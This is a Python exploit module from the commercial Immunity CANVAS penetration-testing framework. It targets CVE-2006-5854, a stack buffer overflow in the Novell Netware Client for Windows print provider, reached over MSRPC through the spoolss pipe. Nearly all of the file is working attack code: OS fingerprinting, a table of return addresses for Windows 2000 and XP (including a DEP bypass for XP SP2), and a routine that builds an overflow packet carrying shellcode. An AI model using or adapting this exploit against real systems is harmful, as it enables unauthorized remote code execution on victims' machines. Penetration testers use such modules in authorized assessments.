#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import struct
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from msrpcexploit import msrpcexploit
from libs.newsmb.libdcerpc import s_dce_raw_unistring
import canvasengine

# GUI info
NAME= "Novell Netware Client for Windows"
DESCRIPTION= "Novell Netware Client for Windows Print Providor Stack Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Novell"
DOCUMENTATION["Date public"] = "11/20/2006"
DOCUMENTATION["References"]="http://support.novell.com/cgi-bin/search/searchtid.cgi?/2974765.htm"
DOCUMENTATION["Platforms Tested"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2006-5854"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5854"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["Notes"]="""
"""
VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "XP" ]

GTK2_DIALOG="dialog.glade2"

CHANGELOG="""
"""

NOTES="""
All versions of Novell Netware Client for Windows up to and including 4.91 SP3 are vulnerable to this flaw.
"""

runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

targets = {
    0 : ["Autoversioning (except for Windows XP SP2)", 0],
    1 : ["Novell Netware Client on Windows 2000", 0x001ecad4, 0, 0, 0],
    2 : ["Novell Netware Client on Windows XP SP0-SP1a", 0x00225028, 0, 0, 0],
    3 : ["Novell Netware Client on Windows XP SP2 English (with DEP)", 0x6f895630, 0x7c952080, 0x7c91d3f8, 0x201b0b9a]
}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.version        = 0
        self.badstring      = "\x00"
        self.UUID           = u"12345678-1234-abcd-ef00-0123456789ab"
        self.uuidversion    = u"1.0"
        self.targetfunction = 0 # EnumPrintersW
        self.name           = NAME

    def buildConnectionList(self):
        self.connectionList= ["ncacn_np:%s[\\spoolss]" % (self.host)]
        return self.connectionList

    def testOS(self):
        app = self.engine.getModuleExploit("osdetect")
        app.link(self)
        self.log("target=%s->%s"%(self.target,app.target))
        result=app.run()
        if result == 0:
            self.log("Unknown OS, automatic detection failed (try choosing a version)")
            return 0
        if app.result.find("2000") > -1:
            self.version = 1
            self.log("OS vulnerable: %s" % result)
            return 1
        elif app.result.find("XP") > -1:
            self.log("OS vulnerable: %s" % result)
            self.version=2
            return 1
        else:
            self.log("OS not vulnerable: %s" % result)
        return 0

    def buildDcePacket(self):
        description, ret1, ret2, ret3, ret4 = targets[self.version]
        data = '\xcc' * 516
        data += struct.pack('<L', 0x00010ff0) # empty string (in environment)
        data += '\xcc'*4
        data += struct.pack('<L', ret1)
        data += '\xcc'*28
        if self.version == 3:
            data += struct.pack('<L', ret2)
            data += struct.pack('<L', ret4)
            data += '\xcc'*16
            data += struct.pack('<L', ret3)
            data += '\xcc'*4
            data += '\xeb\x1a\xcc\xcc' # esi is restored from here
        data += self.shellcode;
        if len(data) % 2 == 1:
            data += '\xcc'
        data += '!\x00'
        packet = intel_order(8)
        packet += intel_order(1)
        packet += s_dce_raw_unistring(data)
        packet += intel_order(1)
        packet += intel_order(0)
        packet += intel_order(0)
        return packet

    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print "%d : %s"% (i, listline[0])
            i = i + 1

if __name__== '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
